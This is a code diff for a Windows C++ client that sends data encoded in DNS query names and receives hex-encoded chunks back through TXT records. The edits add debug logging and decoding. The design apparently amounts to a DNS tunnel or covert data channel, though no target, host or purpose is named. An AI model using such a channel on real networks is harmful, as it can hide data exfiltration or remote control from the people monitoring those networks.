@@ -174,6 +174,10 @@ int sendDataTypeC(int& id, int& packetNumber, size_t& offset, const char* domain
 	std::string full = fullStream.str();
 	const char* pOwnerName = full.c_str();
 	
+	// Debug output
+	std::cout << "[sendDataTypeC] Query: " << full << std::endl;
+	std::cout << "[sendDataTypeC] Query length: " << full.length() << " chars" << std::endl;
+	
 	WORD wType = DNS_TYPE_A;
 	PDNS_RECORD pDnsRecord = nullptr;
 	
@@ -210,15 +214,20 @@ int sendDataTypeC(int& id, int& packetNumber, size_t& offset, const char* domain
 			std::string ipStr = inet_ntoa(ipaddr);
 			DnsRecordListFree(pDnsRecord, DnsFreeRecordList);
 			
+			std::cout << "[sendDataTypeC] Received IP: " << ipStr << std::endl;
+			
 			size_t firstDot = ipStr.find(".");
 			if (firstDot == std::string::npos) {
+				std::cout << "[sendDataTypeC] ERROR: Invalid IP format" << std::endl;
 				goto cleanup;
 			}
 			
 			int code = std::stoi(ipStr.substr(0, firstDot));
+			std::cout << "[sendDataTypeC] Response code: " << code << std::endl;
 			
 			switch (code) {
 			case 200:  
+				std::cout << "[sendDataTypeC] ✓ Success (200)" << std::endl;
 				retCode = 0;
 				goto cleanup;
 					
@@ -244,12 +253,17 @@ int sendDataTypeC(int& id, int& packetNumber, size_t& offset, const char* domain
 				goto cleanup;
 					
 			default:
+				std::cout << "[sendDataTypeC] Unknown response code: " << code << std::endl;
 				goto cleanup;
 			}
+		} else {
+			std::cout << "[sendDataTypeC] Retry " << (i+1) << "/3 - DNS query failed, status: " << status << std::endl;
 		}
 		
 		Sleep(200); 
 	}
+	
+	std::cout << "[sendDataTypeC] All retries failed, returning -1" << std::endl;
 	
 	cleanup:
 		if (pSrvList) {
@@ -304,20 +318,36 @@ int sendDataTypeP(int& id, int& packetNumber, size_t& offset, const char* domain
             if (pDnsRecord->wType == DNS_TYPE_TEXT &&
                 pDnsRecord->Data.TXT.dwStringCount > 0)
             {
-                std::wstring txt = pDnsRecord->Data.TXT.pStringArray[0];
+                std::wstring txtWide = pDnsRecord->Data.TXT.pStringArray[0];
 
                 // --- TXT rỗng => hết chunk ---
-                if (txt.empty()) {
+                if (txtWide.empty()) {
                     retCode = 0;
                     DnsRecordListFree(pDnsRecord, DnsFreeRecordList);
                     goto cleanup;
                 }
 
-                // --- Có chunk => lưu vào global ---
-                {
+                // Convert wstring to narrow string (ASCII hex)
+                std::string hexStr(txtWide.begin(), txtWide.end());
+                
+                // Decode hex to bytes
+                std::string decodedChunk;
+                for (size_t i = 0; i < hexStr.length(); i += 2) {
+                    if (i + 1 < hexStr.length()) {
+                        std::string byteStr = hexStr.substr(i, 2);
+                        char byte = static_cast<char>(std::stoi(byteStr, nullptr, 16));
+                        decodedChunk += byte;
+                    }
+                }
+                
+                // Convert decoded UTF-8 bytes to wstring for g_outChunk
+                int wlen = MultiByteToWideChar(CP_UTF8, 0, decodedChunk.c_str(), -1, nullptr, 0);
+                if (wlen > 0) {
+                    std::wstring wbuf(wlen - 1, 0);
+                    MultiByteToWideChar(CP_UTF8, 0, decodedChunk.c_str(), -1, &wbuf[0], wlen);
+                    
                     std::lock_guard<std::mutex> lock(g_outChunkMutex);
-					// TODO: Check lại kiểu dữ liệu, khả năng cao bị ghi đè, gửi sai dữ liệu
-                    g_outChunk = txt;
+                    g_outChunk = wbuf;
                 }
 
                 retCode = 1; // Có chunk
